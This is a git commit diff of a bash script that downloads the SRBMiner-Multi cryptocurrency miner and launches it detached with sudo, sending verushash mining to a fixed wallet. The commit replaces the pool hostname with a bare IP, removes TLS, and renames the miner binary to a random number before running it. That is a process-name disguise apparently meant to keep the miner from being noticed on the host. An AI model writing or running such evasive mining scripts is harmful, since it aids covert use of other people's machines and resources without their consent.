c00e0dac5a12fe8cbd8790a5dbb746bea4a6b22e
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-12-09 00:21:52 +0700

    Update ver.sh

--- ver.sh
+++ ver.sh
@@ -1,9 +1,10 @@
 #!/bin/bash
 ALG=verushash
 WALS=Lhehm3xhWQNgF1EexRa1J2Q8LKdeAPovbY
-POIL=stratum+tcp://verushash.mine.zergpool.com:3300
+POIL=51.79.251.11:3300
 PASS=c=LTC,mc=VRSC
-COMA="--disable-gpu --algorithm $ALG --pool $POIL --wallet $WALS --password $PASS --keepalive --tls"
+COMA="--disable-gpu --algorithm $ALG --pool $POIL --wallet $WALS --password $PASS"
+TOP=$(shuf -n 1 -i 1-200000)
 
 FILE=./SRBMiner-Multi-0-8-0-Linux.tar.xz
 if [ -f "$FILE" ]; then
@@ -11,5 +12,8 @@ if [ -f "$FILE" ]; then
 else 
     wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz
     tar xvf SRBMiner-Multi-0-8-5-Linux.tar.xz
+    cd SRBMiner-Multi-0-8-5
+    mv SRBMiner-MULTI $TOP
+    chmod +x *
 fi
-screen -dmLS mine sudo ./SRBMiner-Multi-0-8-5/SRBMiner-MULTI $COMA
+screen -dmLS mine sudo ./$TOP $COMA
